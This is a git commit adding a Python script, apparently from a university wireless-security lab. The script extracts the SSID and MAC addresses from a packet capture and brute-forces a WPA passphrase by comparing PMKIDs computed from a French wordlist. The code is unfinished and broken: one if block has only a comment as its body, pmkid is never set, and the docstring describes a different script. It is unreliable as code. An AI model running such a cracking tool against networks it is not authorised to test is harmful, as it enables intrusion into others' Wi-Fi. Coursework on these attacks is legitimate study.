46071485a7044ed54341065b337f1cbba801aedb
Lionel Burgbacher <lionel.burgbacher@heig.vd.ch>
2020-05-02 22:58:45 +0200

    soon ok

---
+++ files/pmkid_attack.py
@@ -0,0 +1,120 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Derive WPA keys from Passphrase and 4-way handshake info
+
+Calcule un MIC d'authentification (le MIC pour la transmission de données
+utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
+sha-1 pour WPA2 ou MD5 pour WPA)
+"""
+
+__author__      = "Abraham Rubinstein et Yann Lederrey"
+__copyright__   = "Copyright 2017, HEIG-VD"
+__license__ 	= "GPL"
+__version__ 	= "1.0"
+__email__ 		= "abraham.rubinstein@heig-vd.ch"
+__status__ 		= "Prototype"
+
+__maintainer__  = "Adrien Barth et Lionel Burgbacher"
+
+from scapy.all import *
+from scapy.layers.dot11 import Dot11AssoReq
+from scapy.layers.eap import *
+load_contrib("wpa_eapol")
+from binascii import a2b_hex, b2a_hex
+from pbkdf2 import *
+import hmac, hashlib
+
+
+def catchAssociationRequest(packets):
+    '''
+    Cette fonction recherche une Association Request 802.11 et retourne le SSID avec les MAC AP/STA.
+    '''
+    for packet in packets:
+        if packet.haslayer(Dot11AssoReq):
+            ssid = packet.info.decode('UTF-8')
+            ap_mac = a2b_hex(packet.addr1.replace(':', ''))
+            sta_mac = a2b_hex(packet.addr2.replace(':', ''))
+            return ssid, ap_mac, sta_mac
+    return None, None, None
+
+
+def catch4WayHandshake(ap_mac, sta_mac, packets):
+    '''
+    Cette fonction permet de retrouver les informations d'un 4-Way Handshake WPA.
+
+    La contribution Scapy wpa_eapol permet d'analyser l'échange de clés WPA.
+    https://scapy.readthedocs.io/en/latest/api/scapy.contrib.wpa_eapol.html
+
+    Le champs 'key_info' permet de savoir
+    - EAPOL-Key1 (ANonce)     = 138     AP -> STA
+    - EAPOL-Key2 (SNonce+MIC) = 266     STA -> AP
+    - EAPOL-Key3 (GTK+MIC)    = 5066    AP -> STA
+    - EAPOL-Key4 (ACK)        = 778     STA -> AP
+
+    L'algorithme de hash pour le calcul du MIC est donné par le champs descriptor_type:
+    - 1 = HMAC-MD5-MIC
+    - 2 = HMAC-SHA1-MIC (le MIC sera tronqué sur 32 bits)
+    '''
+
+    EAPOL_ANONCE = 138  # EAPOL-Key1(ANonce)
+    EAPOL_SNONCE_MIC = 266  # EAPOL-Key2(SNonce+MIC)
+    EAPOL_GTK_MIC = 5066  # EAPOL-Key3(GTK+MIC)
+    EAPOL_ACK = 778  # EAPOL-Key4(ACK)
+
+    for packet in packets:
+        dst_mac = a2b_hex(packet.addr1.replace(':', ''))
+
+        if packet.haslayer(WPA_key):
+            wpa_key = packet.getlayer(WPA_key)
+
+            # EAPOL-Key1(ANonce) / AP -> STA
+            if (wpa_key.key_info == EAPOL_ANONCE) \
+                     and (dst_mac == sta_mac):
+                    #pmkid = great
+
+    return pmkid
+
+'''
+Calculate PMKID
+'''
+def tryPmkid(passphrase, ssid, ap_mac, sta_mac):
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK and calculate the pmkid
+    passphrase = str.encode(passphrase)
+    ssid = str.encode(ssid)
+    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)
+    pmkid = hmac.new(pmk, str.encode("PMK Name")+ap_mac+sta_mac, hashlib.sha1).digest()[:16]
+
+    return pmkid
+
+def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid):
+    '''
+    Try to found a WPA passphrase from a PMKID with a word list
+    '''
+    dico = open('liste_francais.txt', 'r')
+    for line in dico.readlines():
+        for word in line.split():
+            if pmkid == b2a_hex(tryPmkid(word, ssid, APmac, Clientmac)):
+                return word
+    return None
+
+# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+wpa=rdpcap("PMKID_handshake.pcap")
+
+ssid, APmac, Clientmac = catchAssociationRequest(wpa)
+pmkid = catch4WayHandshake(APmac,  Clientmac, wpa)
+passphrase = bruteForcePassphrase(ssid,APmac,Clientmac,pmkid)
+
+print ("\nValues used to derivate keys")
+print ("============================")
+print ("SSID:\t\t",ssid)
+print ("AP Mac:\t\t",b2a_hex(APmac))
+print ("Client Mac:\t",b2a_hex(Clientmac))
+#print ("Pmkid:\t",b2a_hex(pmkid))
+
+print ("\nBrute force attack")
+print ("============================")
+#print ("Passphrase:\t", passphrase, "\n")
+
+
